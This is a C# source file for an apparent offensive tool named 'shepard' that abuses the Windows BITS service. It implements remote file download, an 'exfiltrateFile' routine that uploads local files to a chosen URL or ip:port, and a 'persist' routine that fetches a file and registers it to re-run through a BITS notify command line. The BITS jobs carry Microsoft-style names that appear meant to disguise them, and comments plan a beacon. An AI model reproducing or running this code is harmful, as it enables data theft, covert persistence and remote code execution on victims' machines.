using BITSReference1_5;
using System;
using System.Diagnostics;
using System.Net;
using BITS = BITSReference1_5;


//add a beacon function somewhere in main ^
//redownload this executable and run again using bits, different job
namespace shepard
{
    class JobObj
    {
        static BITS.BackgroundCopyManager1_5 mgr;
        static BITS.GUID jobGuid;
        static BITS.IBackgroundCopyJob job;
        static JobObj jo;

        public JobObj()
        {
            mgr = new BITS.BackgroundCopyManager1_5();
        }

        public static void Main(string[] args)
        {
            if (args.Length == 0) { return; }

            jo = new JobObj();

            string switchCase = args[0];

            switch (switchCase)
            {
                case "-d":
                    if (args.Length == 3)
                    {
                        jo.downloadFile("Microsoft Example QD_1", args[1], args[2]);
                        break;
                    }
                    return;
                case "-e":
                    if (args.Length == 3)
                    {
                        jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]);
                        break;
                    }
                    return;
                case "-dr":
                    if (args.Length == 4)
                    {
                        jo.persist(args[1], args[2], args[3]);
                        break;
                    }
                    else if (args.Length == 3)
                    {
                        jo.persist(args[1], args[2], "");
                        break;
                    }
                    return;
                case "-t":
                    jo.testpersist();
                    return;
                default:
                    return;
            }

        }

        //Usage params: url or ip:port, full path
        private void downloadFile(string name, string remoteLoc, string writeLoc)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            //job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
            //job.AddFile("23.52.161.19:443", @"C:\Users\student\Desktop\Server2016.pdf");
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob();

        }

        //Usage params: url or ip:port, full path
        private void exfiltrateFile(string name, string remoteLoc, string writeLoc)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob();
        }

        //Default execution of a BITS Job, fully completes
        private void executeBITSJob()
        {
            job.Resume();
            bool jobIsFinal = false;
            while (!jobIsFinal)
            {
                BITS.BG_JOB_STATE state;
                job.GetState(out state);
                switch (state)
                {
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                        job.Complete();
                        break;

                    case BITS.BG_JOB_STATE.BG_JOB_STATE_CANCELLED: //can i use this?
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                        jobIsFinal = true;
                        break;
                    default:
                        System.Threading.Tasks.Task.Delay(500); // delay a little bit
                        break;
                }
            }
        }

        //Usage: BITS job name, file path, "file args"
        private void persist(string remote, string filePath, string cmdArgs)
        {
            string name = "Microsoft Example BD_1";
            jo.downloadFile(name, remote, filePath); //initial download, completes

            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            job.AddFile(remote, filePath);
            var job2 = job as BITS.IBackgroundCopyJob2;
            job2.SetNotifyCmdLine(filePath, cmdArgs); //runs the file through CMD with params
            job.SetMinimumRetryDelay(60);
            
            job.Resume();
        }

        private void testpersist()
        {
            string name = "Microsoft Example BD_1";
            string remote = "https://aka.ms/WinServ16/StndPDF";
            string filePath = "C:\\Users\\enzod\\Desktop\\Server2016.pdf";
            jo.downloadFile(name, remote, filePath); //initial download, completes

            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            job.AddFile(remote, filePath);
            var job2 = job as BITS.IBackgroundCopyJob2;
            job2.SetNotifyCmdLine("C:\\Windows\\System32\\calc.exe", ""); //runs the file through CMD with params
            job.SetMinimumRetryDelay(60);

            job.Resume();
        }
    }
}
